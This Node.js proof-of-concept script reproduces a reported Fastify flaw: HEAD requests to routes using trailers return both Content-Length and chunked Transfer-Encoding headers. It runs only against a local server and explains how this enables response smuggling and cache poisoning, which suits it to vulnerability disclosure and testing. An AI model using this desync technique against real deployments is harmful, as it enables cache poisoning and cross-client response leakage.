'use strict'
/*
 * PoC — G1: Response-framing desync (Content-Length + Transfer-Encoding) in Fastify 5.10.0
 * ---------------------------------------------------------------------------
 * When a route uses `reply.trailer()`, lib/reply.js:590-601 switches the
 * response to `Transfer-Encoding: chunked` but never removes a `Content-Length`
 * that another code path already set. The Content-Length reconciliation at
 * lib/reply.js:677-686 is skipped whenever trailers are present
 * (`if (reply[kReplyTrailers] === null)`).
 *
 * The auto-generated HEAD route's onSend handler (lib/head-route.js:29-31) sets
 * `Content-Length` to the would-be body size. So a HEAD request to any GET
 * route that uses `reply.trailer()` emits a response containing BOTH
 * `Content-Length` and `Transfer-Encoding: chunked` — a violation of
 * RFC 9112 s6.1 and a classic response-smuggling / desync primitive: a
 * downstream intermediary that frames by Content-Length reads N bytes of the
 * FOLLOWING response as this response's body, misaligning every boundary after
 * it (response smuggling, cache poisoning, cross-client response bleed).
 *
 * This script starts a real server, then on ONE keep-alive connection sends a
 * GET (to show correct chunked framing) and a HEAD (to show the CL+TE bug), and
 * prints the raw bytes returned.
 *
 *   Run:  node poc.js
 */
const path = require('path')
const net = require('net')
const Fastify = require(path.join(__dirname, '..', '..', 'fastify.js'))

const app = Fastify({ logger: false })

// A GET route that attaches a trailer (a documented Fastify feature).
app.get('/data', (req, reply) => {
  reply.trailer('x-checksum', (r, p, cb) => cb(null, 'abc123'))
  reply.send('hello!!') // 7-byte body
})

function rawRequest (port, reqLine) {
  return new Promise((resolve) => {
    const s = net.connect(port, '127.0.0.1', () => s.write(reqLine))
    let buf = ''
    s.on('data', (d) => (buf += d.toString('latin1')))
    s.on('close', () => resolve(buf))
    // trailer/keep-alive responses may not close promptly; cap the read window
    setTimeout(() => { s.destroy(); resolve(buf) }, 800)
  })
}

function headSection (raw) { return (raw.split('\r\n\r\n')[0] || '').toLowerCase() }

app.listen({ port: 0, host: '127.0.0.1' }).then(async () => {
  const port = app.server.address().port
  console.log('=== G1 PoC: Content-Length + Transfer-Encoding response desync ===\n')

  const getRaw = await rawRequest(port, 'GET /data HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n')
  console.log('--- GET /data (correct: chunked only) ---')
  console.log(getRaw.replace(/\r\n/g, '\\r\\n\n'))

  const headRaw = await rawRequest(port, 'HEAD /data HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n')
  console.log('--- HEAD /data (BUG: Content-Length AND Transfer-Encoding) ---')
  console.log(headRaw.replace(/\r\n/g, '\\r\\n\n'))

  const h = headSection(headRaw)
  const hasCL = /content-length:\s*\d+/.test(h)
  const hasTE = /transfer-encoding:\s*chunked/.test(h)
  console.log(`HEAD response has Content-Length?        ${hasCL}`)
  console.log(`HEAD response has Transfer-Encoding?     ${hasTE}`)
  console.log(`BOTH present (RFC 9112 s6.1 violation)?  ${hasCL && hasTE}\n`)

  if (hasCL && hasTE) {
    console.log('==> VULNERABLE: the HEAD response is ambiguously framed. A downstream proxy that')
    console.log('    trusts Content-Length reads that many bytes of the NEXT response as this body,')
    console.log('    desynchronising the connection -> response smuggling / cache poisoning.')
    process.exit(0)
  } else {
    console.log('==> Not reproduced in this environment.')
    process.exit(1)
  }
})
